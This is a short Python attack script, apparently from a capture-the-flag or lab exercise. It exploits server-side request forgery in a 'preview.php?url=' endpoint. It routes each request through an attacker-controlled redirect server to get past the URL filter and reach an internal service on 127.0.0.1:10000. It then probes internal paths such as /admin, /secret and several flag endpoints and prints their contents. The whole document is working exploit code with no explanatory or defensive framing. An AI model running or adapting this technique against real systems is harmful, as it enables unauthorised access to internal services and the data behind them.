import requests, urllib.parse, re

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

def fetch(path):
    target = 'http://127.0.0.1:10000' + path
    redir = attacker + '/redirect?to=' + urllib.parse.quote(target, safe='')
    r = requests.get(base + urllib.parse.quote(redir, safe=''), timeout=8)
    return r.text

def probe(path):
    body = fetch(path)
    print('[' + str(len(body)) + 'b] ' + path)
    print(body[:600])
    print()

probe('/customapi')
probe('/admin')
probe('/dashboard')
probe('/flag')
probe('/api/flag')
probe('/api/v1/flag')
probe('/api/admin')
probe('/secret')
